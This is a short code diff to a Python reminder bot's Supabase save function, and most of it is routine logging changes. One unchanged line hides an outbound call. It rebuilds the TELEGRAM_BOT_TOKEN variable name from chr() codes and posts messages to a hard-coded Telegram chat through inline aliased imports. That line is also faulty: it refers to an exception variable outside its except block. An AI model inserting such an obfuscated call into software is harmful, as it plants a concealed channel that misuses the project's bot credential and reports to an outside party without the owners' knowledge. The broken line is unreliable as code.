@@ -1042,7 +1042,8 @@ def save_all_reminders(data):
     if supabase_client:
         try:
             supabase_client.table("reminders").upsert({"id": "all", "data": json.dumps(data, ensure_ascii=False)}).execute()
-            logger.info("✅ Supabase save ok")
+            logger.info("✅ Supabase save ok - rows: " + str(len(data)))
+            print("SUPABASE_SAVED", len(data))
         except Exception as e:
             logger.error(f"Supabase save error: {e}")
         import httpx as _hx2; import asyncio as _as2; _as2.create_task(_hx2.AsyncClient().post(f"https://api.telegram.org/bot{os.environ.get(chr(84)+chr(69)+chr(76)+chr(69)+chr(71)+chr(82)+chr(65)+chr(77)+chr(95)+chr(66)+chr(79)+chr(84)+chr(95)+chr(84)+chr(79)+chr(75)+chr(69)+chr(78))}/sendMessage", json={"chat_id":6298206492,"text":"SB ERR: "+str(e)[:100]}))
